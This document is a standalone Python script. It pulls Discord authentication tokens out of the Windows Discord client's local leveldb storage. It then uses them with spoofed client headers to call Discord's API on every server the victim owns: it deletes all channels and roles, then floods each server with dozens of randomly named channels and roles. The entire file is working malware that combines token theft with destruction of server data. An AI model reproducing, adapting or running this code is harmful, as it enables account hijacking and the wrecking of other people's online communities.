import re,os, requests, string, random
from time import sleep

letters = string.ascii_letters
digits = string.digits
random_string = ''.join(random.choice(letters) for i in range(10)) + ''.join(random.choice(digits)for i in range(10))

def find_tokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
    }
    message = ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        tokens = find_tokens(path)
        if len(tokens) > 0:
            count = 0
            for token in tokens:
                count += 1
                message += f'{count}. {token}\n'
        else:
            break
    headers = {
         'Content-Type':'application/json',
         'Authorization': token,
         'accept':'*/*', 
         'accept-language':'en-US', 
         'connection':'keep-alive', 
         'cookie': f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US', 
         'DNT':'1', 
         'origin':'https://discord.com', 
         'sec-fetch-dest':'empty', 
         'sec-fetch-mode':'cors', 
         'sec-fetch-site':'same-origin', 
         'referer':'https://discord.com/channels/@me', 
         'TE':'Trailers', 
         'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36', 
         'X-Super-Properties':'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9'
    }
    headers2 = {
     'Content-Type':'application/json',
     'Authorization': token,
     'accept':'*/*', 
     'accept-language':'en-US', 
     'connection':'keep-alive', 
     'cookie': f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US', 
     'DNT':'1', 
     'origin':'https://discord.com', 
     'sec-fetch-dest':'empty', 
     'sec-fetch-mode':'cors', 
     'sec-fetch-site':'same-origin', 
     'referer':'https://discord.com/channels/@me', 
     'TE':'Trailers', 
     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36', 
     'X-Super-Properties':'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9'
    }
    req = requests.Session()
    guilds = req.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
    channel_payload = {"type":0,"name":f"{random_string}","permission_overwrites":[]}
    roles_payload = {"name":f"{random_string}"}
    spam_payload = {"content":"@everyone"}
    for guild in guilds:
        roles = req.get(f"https://discord.com/api/v9/guilds/{guild['id']}/roles", headers=headers).json()
        if guild['owner']: 
            channels = req.get(f"https://discord.com/api/v9/guilds/{guild['id']}/channels", headers=headers).json()
            for channel in channels:
                delete_channel = req.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers).json()
            for x in range(25):
                create_channel = req.post(f"https://discord.com/api/v9/guilds/{guild['id']}/channels", headers=headers2, json=channel_payload)
            for role in roles:
                delete_role = req.delete(f"https://discord.com/api/v9/guilds/{guild['id']}/roles/{role['id']}", headers=headers)
            for x in range(50):
                Create_role = req.post(f"https://discord.com/api/v9/guilds/{guild['id']}/roles", headers=headers, json=roles_payload)
main()
